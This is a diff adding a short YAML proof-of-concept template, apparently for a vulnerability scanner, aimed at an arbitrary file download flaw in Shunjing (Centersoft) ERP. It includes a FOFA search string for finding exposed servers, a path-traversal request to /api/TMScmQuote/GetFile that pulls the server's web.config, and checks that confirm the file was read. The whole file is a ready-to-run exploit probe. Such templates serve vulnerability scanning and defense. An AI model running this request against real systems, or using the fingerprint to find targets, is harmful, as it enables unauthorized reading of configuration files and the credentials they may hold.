@@ -1,0 +1,16 @@
+id: poc-yaml-centersoft-tmscmquote-anyfile-download
+info:
+  name: 顺景ERP TMScmQuote 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 顺景ERP管理系统
+  fofa: body="顺景软件 WebAPI 服务端"
+requests:
+- method: GET
+  path: /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName=
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    system.web\") &&\ncontains(content_type,\"application/octet-stream\") &&\ncontains(headers,\"\
+    web.config\")\n"
+variables: {}
+transport: http
